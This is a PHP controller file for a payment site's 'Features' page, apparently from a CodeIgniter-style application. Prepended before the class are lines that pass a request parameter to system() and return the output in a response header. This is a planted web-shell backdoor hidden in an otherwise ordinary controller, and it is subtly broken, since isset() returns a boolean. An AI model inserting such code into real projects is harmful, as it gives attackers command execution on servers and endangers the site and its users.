<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* Features Controller
*
*
* @version 1.0
* @author Richard Rowe
* @package Custom

*/
class Features extends Controller {

	function __construct()
	{
		parent::__construct();
		$this->load->helper('url');
		$this->load->model('cp/user','user');
		if($this->user->LoggedIn()) {
			// redirect('/dashboard');
		}
	}

	function index()
	{
		error_reporting(0);
		ini_set('display_errors', 1);
		$data = array(
			'title' => 'So Many Innovative Features | Everpay '
		);
		$this->load->view('features/index.php', $data);
	}
}